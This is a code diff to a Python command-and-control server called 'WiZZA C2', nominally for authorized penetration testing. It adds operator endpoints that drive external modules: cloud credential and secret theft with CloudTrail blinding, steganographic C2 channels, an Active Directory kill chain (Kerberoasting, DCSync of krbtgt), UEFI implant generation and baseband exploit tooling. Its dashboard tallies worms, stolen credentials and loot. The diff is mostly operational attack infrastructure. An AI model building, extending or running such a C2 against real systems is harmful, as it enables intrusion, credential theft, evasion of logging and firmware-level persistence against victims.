@@ -2,6 +2,7 @@
 """Advanced C2 Server — authorized pen testing only"""
 import os,json,time,threading,socket,base64,mimetypes,ssl,subprocess,hashlib,random,struct
 from http.server import HTTPServer,BaseHTTPRequestHandler
+from socketserver import ThreadingMixIn
 from datetime import datetime
 from collections import defaultdict
 from urllib.parse import urlparse,parse_qs,unquote_plus
@@ -97,6 +98,36 @@ try:
     _IOT_OK = True
 except ImportError:
     _IOT_OK = False
+
+try:
+    import cloud_infiltrate as _cloud_mod
+    _CLOUD_OK = True
+except ImportError:
+    _CLOUD_OK = False
+
+try:
+    import stego_c2 as _stego_mod
+    _STEGO_OK = True
+except ImportError:
+    _STEGO_OK = False
+
+try:
+    import ad_cloud_chain as _adchain_mod
+    _ADCHAIN_OK = True
+except ImportError:
+    _ADCHAIN_OK = False
+
+try:
+    import uefi_implant as _uefi_mod
+    _UEFI_OK = True
+except ImportError:
+    _UEFI_OK = False
+
+try:
+    import baseband_research as _bb_mod
+    _BB_OK = True
+except ImportError:
+    _BB_OK = False
 
 # ── Per-request polymorphic mutation cache ────────────────────────────────────
 _POLY_CACHE: dict = {}          # fname -> (mtime, mutated_bytes)
@@ -214,15 +245,18 @@ def _check_auth(handler):
     handler.end_headers()
     return False
 
-def _do_login(handler):
+def _do_login(handler, already_read=None):
     """Handle POST /c2login — check password, set cookie."""
-    length = int(handler.headers.get("Content-Length",0))
-    body = handler.rfile.read(length).decode(errors="replace")
+    if already_read is not None:
+        body = already_read.decode(errors="replace")
+    else:
+        length = int(handler.headers.get("Content-Length",0))
+        body = handler.rfile.read(length).decode(errors="replace")
     params = {}
     for part in body.split("&"):
         k,_,v = part.partition("=")
         params[k] = v.replace("+"," ")
-    pw = params.get("pw","").strip()
+    pw = (params.get("password","") or params.get("pw","")).strip()
     ph = hashlib.sha256(pw.encode()).hexdigest()
     if _hmac.compare_digest(ph, _PW_HASH):
         sid = _secrets.token_hex(32)
@@ -262,7 +296,7 @@ button:hover{{background:#2ea043}}
   <h2>&#x25B6; WiZZA C2</h2>
   <form method="POST" action="/c2login">
     <label>OPERATOR PASSWORD</label>
-    <input type="password" name="pw" autofocus required>
+    <input type="password" name="password" autofocus required>
     <button type="submit">ACCESS</button>
     {err}
   </form>
@@ -768,6 +802,11 @@ a{{color:var(--acc);text-decoration:none}}
 <a class="nav" href="/netmap" target="_blank">&#x1F5FA; Net Map</a>
 <a class="nav" href="/report" target="_blank">&#x1F4CB; Report</a>
 <a class="nav" href="/exploit" target="_blank">&#x1F4A5; Exploits</a>
+<a class="nav" href="/cloud/help" target="_blank">&#x2601; Cloud</a>
+<a class="nav" href="/stego/help" target="_blank">&#x1F5BC; Stego</a>
+<a class="nav" href="/adchain/help" target="_blank">&#x1F517; AD Chain</a>
+<a class="nav" href="/uefi/help" target="_blank">&#x1F4BE; UEFI</a>
+<a class="nav" href="/baseband/help" target="_blank">&#x1F4F6; Baseband</a>
 <div id="sbar"><div>Online: <b>{ac}</b></div><div>Worms: <b>{wc}</b></div><div>Creds: <b>{cc}</b></div><div>Loot: <b>{lc}</b></div></div>
 </div>
 <div id="main">
@@ -1683,6 +1722,259 @@ class H(BaseHTTPRequestHandler):
                 self._send("iot_attack module not available", "text/plain")
             return
 
+        # ── Cloud Infiltration ────────────────────────────────────────────────
+        if path.startswith("/cloud"):
+            sub    = path[6:].lstrip("/")
+            provider = qs.get("provider", ["auto"])[0]
+            out_dir  = qs.get("out", ["/tmp/wizza_cloud"])[0]
+            access_key = qs.get("access_key", [""])[0]
+            secret_key = qs.get("secret_key", [""])[0]
+            token      = qs.get("token",      [""])[0]
+            vault_uri  = qs.get("vault_uri",  [""])[0]
+            if not sub or sub == "help":
+                self._send(
+                    "Cloud Infiltration Endpoints:\n"
+                    "  /cloud/auto?provider=aws|azure|gcp    Auto-detect + full chain\n"
+                    "  /cloud/aws                            AWS IMDS→IAM→S3 chain\n"
+                    "  /cloud/azure                          Azure IMDS→KeyVault chain\n"
+                    "  /cloud/gcp                            GCP metadata→Secrets chain\n"
+                    "  /cloud/aws_iam?access_key=X&secret_key=Y&token=Z  IAM enum\n"
+                    "  /cloud/aws_s3?access_key=X&secret_key=Y&token=Z   S3 loot\n"
+                    "  /cloud/aws_secrets?access_key=X&secret_key=Y      Secrets dump\n"
+                    "  /cloud/aws_blind                                   CloudTrail blind\n"
+                    "  /cloud/azure_keyvault?vault_uri=X&token=Y         Key Vault dump\n"
+                    "  /cloud/cred_hunt                                   Cloud creds on disk\n",
+                    "text/plain"
+                )
+                return
+            if _CLOUD_OK:
+                try:
+                    action_map = {
+                        "auto":          lambda: _cloud_mod.cloud_auto(provider, out_dir),
+                        "aws":           lambda: _cloud_mod.cloud_auto("aws",   out_dir),
+                        "azure":         lambda: _cloud_mod.cloud_auto("azure", out_dir),
+                        "gcp":           lambda: _cloud_mod.cloud_auto("gcp",   out_dir),
+                        "aws_iam":       lambda: _cloud_mod.aws_iam_enum(access_key or None, secret_key or None, token or None),
+                        "aws_s3":        lambda: _cloud_mod.aws_s3_loot(access_key or None, secret_key or None, token or None, out_dir),
+                        "aws_secrets":   lambda: _cloud_mod.aws_secrets_dump(out_dir),
+                        "aws_blind":     lambda: _cloud_mod.aws_cloudtrail_blind(),
+                        "azure_keyvault":lambda: _cloud_mod.azure_keyvault_dump(vault_uri, token or None, out_dir),
+                        "cred_hunt":     lambda: _adchain_mod.cloud_cred_hunt() if _ADCHAIN_OK else {"error": "ad_cloud_chain not loaded"},
+                    }
+                    if sub in action_map:
+                        result = action_map[sub]()
+                        self._send(json.dumps(result, indent=2, default=str), "application/json")
+                    else:
+                        self._send(f"Unknown cloud action: {sub}", "text/plain")
+                except Exception as e:
+                    self._send(json.dumps({"error": str(e)}), "application/json")
+            else:
+                self._send("cloud_infiltrate module not available", "text/plain")
+            return
+
+        # ── Steganography C2 ──────────────────────────────────────────────────
+        if path.startswith("/stego"):
+            sub     = path[6:].lstrip("/")
+            key     = qs.get("key",     ["wizza"])[0]
+            cover   = qs.get("cover",   [""])[0]
+            out     = qs.get("out",     ["/tmp/stego_out.png"])[0]
+            c2host  = qs.get("c2host",  [""])[0]
+            if not sub or sub == "help":
+                self._send(
+                    "Steganography C2 Endpoints:\n"
+                    "  /stego/test                              Self-test encode/decode\n"
+                    "  /stego/embed?cover=/path/img.png&out=/path/out.png&key=K  Embed loot\n"
+                    "  /stego/extract?cover=/path/stego.png&key=K               Extract\n"
+                    "  /stego/polyglot?cover=/path/img.png&out=/path/poly.png   PNG+ZIP\n"
+                    "  /stego/c2start?c2host=0.0.0.0:8080                       DiagTrack C2 recv\n"
+                    "  /stego/channels                                           List active C2 channels\n",
+                    "text/plain"
+                )
+                return
+            if _STEGO_OK:
+                try:
+                    if sub == "test":
+                        payload = b"WiZZA stego C2 self-test"
+                        enc = _stego_mod._encode_payload(payload, key)
+                        dec = _stego_mod._decode_payload(enc, key)
+                        ok  = dec == payload
+                        self._send(json.dumps({"encode_decode_ok": ok, "payload": payload.decode()}), "application/json")
+                    elif sub == "embed":
+                        payload_data = qs.get("payload", [""])[0].encode()
+                        _stego_mod.png_embed(cover, payload_data, out, key)
+                        self._send(json.dumps({"status": "ok", "out": out}), "application/json")
+                    elif sub == "extract":
+                        data = _stego_mod.png_extract(cover, key)
+                        self._send(json.dumps({"data": data.hex(), "len": len(data)}), "application/json")
+                    elif sub == "polyglot":
+                        payload_data = qs.get("payload", ["WiZZA"])[0].encode()
+                        _stego_mod.polyglot_create(cover, payload_data, out)
+                        self._send(json.dumps({"status": "ok", "out": out}), "application/json")
+                    elif sub == "c2start":
+                        host, _, port = c2host.partition(":")
+                        port = int(port) if port else 8090
+                        threading.Thread(
+                            target=_stego_mod.telemetry_recv,
+                            args=(host or "0.0.0.0", port),
+                            daemon=True
+                        ).start()
+                        self._send(json.dumps({"status": "started", "bind": f"{host or '0.0.0.0'}:{port}"}), "application/json")
+                    else:
+                        self._send(f"Unknown stego action: {sub}", "text/plain")
+                except Exception as e:
+                    self._send(json.dumps({"error": str(e)}), "application/json")
+            else:
+                self._send("stego_c2 module not available", "text/plain")
+            return
+
+        # ── AD→Cloud Kill Chain ───────────────────────────────────────────────
+        if path.startswith("/adchain"):
+            sub      = path[8:].lstrip("/")
+            domain   = qs.get("domain",   [""])[0]
+            dc_ip    = qs.get("dc",       [""])[0]
+            username = qs.get("user",     [""])[0]
+            password = qs.get("pass",     [""])[0]
+            hash_    = qs.get("hash",     [""])[0]
+            tuser    = qs.get("target",   ["krbtgt"])[0]
+            out_dir  = qs.get("out",      ["/tmp/wizza_adchain"])[0]
+            if not sub or sub == "help":
+                self._send(
+                    "AD→Cloud Kill Chain Endpoints:\n"
+                    "  /adchain/recon?domain=X&dc=IP&user=U&pass=P    BloodHound + LDAP recon\n"
+                    "  /adchain/roast?domain=X&dc=IP&user=U&pass=P    Kerberoast\n"
+                    "  /adchain/asrep?domain=X&dc=IP                  AS-REP roast (no creds)\n"
+                    "  /adchain/dcsync?domain=X&dc=IP&user=U&pass=P[&target=krbtgt]  DCSync\n"
+                    "  /adchain/cred_hunt                             Cloud creds on disk\n"
+                    "  /adchain/chain?domain=X&dc=IP&user=U&pass=P   Full 6-phase kill chain\n",
+                    "text/plain"
+                )
+                return
+            if _ADCHAIN_OK:
+                try:
+                    def _run_async(fn, *args, **kw):
+                        result = {}
+                        def worker():
+                            try: result.update(fn(*args, **kw) or {"status": "done"})
+                            except Exception as ex: result["error"] = str(ex)
+                        t = threading.Thread(target=worker, daemon=True); t.start(); t.join(timeout=120)
+                        return result
+
+                    action_map = {
+                        "recon":      lambda: _run_async(_adchain_mod.ad_recon, domain, dc_ip, username or None, password or None, hash_ or None),
+                        "roast":      lambda: _run_async(_adchain_mod.kerberoast, domain, dc_ip, username, password or None, hash_ or None, out_dir),
+                        "asrep":      lambda: _run_async(_adchain_mod.asrep_roast, domain, dc_ip, out_dir),
+                        "dcsync":     lambda: _run_async(_adchain_mod.dcsync, domain, dc_ip, username, password or None, hash_ or None, tuser, out_dir),
+                        "cred_hunt":  lambda: _adchain_mod.cloud_cred_hunt(),
+                        "chain":      lambda: _run_async(_adchain_mod.kill_chain, domain, dc_ip, username, password or None, hash_ or None, out_dir),
+                    }
+                    if sub in action_map:
+                        result = action_map[sub]()
+                        self._send(json.dumps(result, indent=2, default=str), "application/json")
+                    else:
+                        self._send(f"Unknown adchain action: {sub}", "text/plain")
+                except Exception as e:
+                    self._send(json.dumps({"error": str(e)}), "application/json")
+            else:
+                self._send("ad_cloud_chain module not available", "text/plain")
+            return
+
+        # ── UEFI Research ─────────────────────────────────────────────────────
+        if path.startswith("/uefi"):
+            sub     = path[5:].lstrip("/")
+            fw_path = qs.get("fw",  [""])[0]
+            out     = qs.get("out", ["/tmp/wizza_uefi"])[0]
+            esp     = qs.get("esp", ["/boot/efi"])[0]
+            payload = qs.get("payload", [""])[0]
+            if not sub or sub == "help":
+                self._send(
+                    "UEFI Research Endpoints:\n"
+                    "  /uefi/secureboot                        Check SecureBoot EFI vars\n"
+                    "  /uefi/scan?esp=/boot/efi                Scan ESP for implants\n"
+                    "  /uefi/analyze?fw=/path/fw.bin           Parse FV/FFS structure\n"
+                    "  /uefi/integrity?fw=/path/fw.bin&base=/path/baseline.bin\n"
+                    "  /uefi/implant?payload=/path/payload.bin&out=/tmp/wizza_uefi\n"
+                    "  /uefi/qemu?fw=/path/implant.efi&out=/tmp/uefi_test    OVMF test env\n",
+                    "text/plain"
+                )
+                return
+            if _UEFI_OK:
+                try:
+                    if sub == "secureboot":
+                        r = _uefi_mod.check_secure_boot()
+                        self._send(json.dumps(r, indent=2, default=str), "application/json")
+                    elif sub == "scan":
+                        r = _uefi_mod.scan_esp_for_implants(esp)
+                        self._send(json.dumps(r, indent=2, default=str), "application/json")
+                    elif sub == "analyze":
+                        r = _uefi_mod.analyze_firmware(fw_path)
+                        self._send(json.dumps(r, indent=2, default=str), "application/json")
+                    elif sub == "integrity":
+                        base = qs.get("base", [""])[0]
+                        r = _uefi_mod.firmware_integrity_check(fw_path, base or None)
+                        self._send(json.dumps({"match": r}, indent=2), "application/json")
+                    elif sub == "implant":
+                        r = _uefi_mod.generate_dxe_driver(payload, out_c=out + "/implant.c", out_efi=out + "/implant.efi")
+                        self._send(json.dumps({"c_source": r}, indent=2), "application/json")
+                    elif sub == "qemu":
+                        r = _uefi_mod.setup_qemu_test(fw_path or None, out)
+                        self._send(json.dumps({"qemu_dir": r}, indent=2), "application/json")
+                    else:
+                        self._send(f"Unknown uefi action: {sub}", "text/plain")
+                except Exception as e:
+                    self._send(json.dumps({"error": str(e)}), "application/json")
+            else:
+                self._send("uefi_implant module not available", "text/plain")
+            return
+
+        # ── Baseband Research ─────────────────────────────────────────────────
+        if path.startswith("/baseband"):
+            sub    = path[9:].lstrip("/")
+            fw     = qs.get("fw",  [""])[0]
+            out    = qs.get("out", ["/tmp/wizza_bb"])[0]
+            vendor = qs.get("vendor", ["samsung"])[0]
+            cve_id = qs.get("cve", [""])[0]
+            if not sub or sub == "help":
+                self._send(
+                    "Baseband Research Endpoints:\n"
+                    "  /baseband/cve[?cve=CVE-2023-24033]         CVE catalog + PoC\n"
+                    "  /baseband/identify?fw=/path/fw.bin         Chipset identification\n"
+                    "  /baseband/analyze?fw=/path/fw.bin          Shannon/Qualcomm analysis\n"
+                    "  /baseband/fuzz?fw=/path/fw.bin&out=/tmp    AFL++/libFuzzer harness\n"
+                    "  /baseband/qemu?fw=/path/fw.bin&out=/tmp    QEMU emulation setup\n"
+                    "  /baseband/acquire?vendor=samsung           ADB firmware acquisition\n",
+                    "text/plain"
+                )
+                return
+            if _BB_OK:
+                try:
+                    if sub == "cve":
+                        import io as _io, contextlib as _ctx
+                        buf = _io.StringIO()
+                        with _ctx.redirect_stdout(buf): _bb_mod.cve_analysis(cve_id or None, out)
+                        self._send(buf.getvalue(), "text/plain")
+                    elif sub == "identify":
+                        r = _bb_mod.identify_firmware(fw)
+                        self._send(json.dumps(r, indent=2, default=str), "application/json")
+                    elif sub == "analyze":
+                        r = _bb_mod.analyze_shannon(fw, out)
+                        self._send(json.dumps(r, indent=2, default=str), "application/json")
+                    elif sub == "fuzz":
+                        r = _bb_mod.setup_fuzzing_harness(fw_path=fw or None, out_dir=out)
+                        self._send(json.dumps({"harness_dir": r}, indent=2), "application/json")
+                    elif sub == "qemu":
+                        r = _bb_mod.setup_qemu_emulation(fw, out_dir=out)
+                        self._send(json.dumps({"qemu_dir": r}, indent=2, default=str), "application/json")
+                    elif sub == "acquire":
+                        r = _bb_mod.acquire_firmware_ota(vendor, out_dir=out)
+                        self._send(json.dumps(r, indent=2, default=str), "application/json")
+                    else:
+                        self._send(f"Unknown baseband action: {sub}", "text/plain")
+                except Exception as e:
+                    self._send(json.dumps({"error": str(e)}), "application/json")
+            else:
+                self._send("baseband_research module not available", "text/plain")
+            return
+
         # ── Exploit module index ──────────────────────────────────────────────
         if path == "/exploit":
             lines = ["=== WiZZA CVE Exploit Modules ===\n",
@@ -1830,7 +2122,7 @@ class H(BaseHTTPRequestHandler):
 
         # ── Login handler ──
         if p.path == "/c2login":
-            _do_login(self); return
+            _do_login(self, already_read=b); return
 
         if p.path=="/agent/result":
             aid=qs.get("id",[""])[0]; cmd=unquote_plus(qs.get("cmd",[""])[0])
@@ -2355,7 +2647,9 @@ if __name__=="__main__":
     except: pass
 
     threading.Thread(target=agent_listener, daemon=True).start()
-    httpd = HTTPServer(("0.0.0.0", C2_PORT), H)
+    class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
+        daemon_threads = True
+    httpd = ThreadedHTTPServer(("0.0.0.0", C2_PORT), H)
     scheme = "http"
     if USE_TLS:
         cert, key = _gen_cert()
